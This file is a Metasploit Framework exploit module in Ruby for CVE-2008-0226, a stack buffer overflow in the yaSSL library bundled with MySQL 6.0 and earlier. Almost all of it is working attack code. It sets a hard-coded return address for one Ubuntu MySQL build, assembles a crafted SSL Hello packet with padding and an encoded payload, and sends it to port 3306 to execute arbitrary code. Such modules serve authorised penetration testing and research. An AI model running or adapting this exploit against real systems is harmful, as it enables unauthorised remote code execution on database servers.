##
# $Id: mysql_yassl_hello.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MySQL yaSSL SSL Hello Message Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the yaSSL (1.7.5 and earlier)
				implementation bundled with MySQL <= 6.0. By sending a specially crafted
				Hello packet, an attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2008-0226' ],
					[ 'OSVDB', '41195' ],
					[ 'BID', '27140' ],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 100,
					'BadChars' => "\x00\x20\x0a\x0d\x2f\x2b\x0b\x5c",
				},
			'Platform'       => 'linux',
			'Targets'        =>
				[
					[ 'MySQL 5.0.45-Debian_1ubuntu3.1-log', { 'Ret' => 0x085967fb } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 4 2008'))

		register_options(
			[
				Opt::RPORT(3306)
			], self.class)
	end

	def exploit
		connect

		sock.get_once

		req_uno =  [0x01000020].pack('V')

		req_dos =  [0x00008daa].pack('V') + [0x40000000].pack('V')
		req_dos << [0x00000008].pack('V') + [0x00000000].pack('V')
		req_dos << [0x00000000].pack('V') + [0x00000000].pack('V')
		req_dos << [0x00000000].pack('V') + [0x00000000].pack('V')
		req_dos << [0x03010000].pack('V') + [0x00000001].pack('V')
		req_dos << "\x00\x0F\xFF" + rand_text_alphanumeric(3965)
		req_dos << [target.ret].pack('V') + payload.encoded
		req_dos << rand_text_alphanumeric(1024)

		print_status("Trying target #{target.name}...")

		sock.put(req_uno)
		sock.put(req_dos)

		handler
		disconnect
	end

end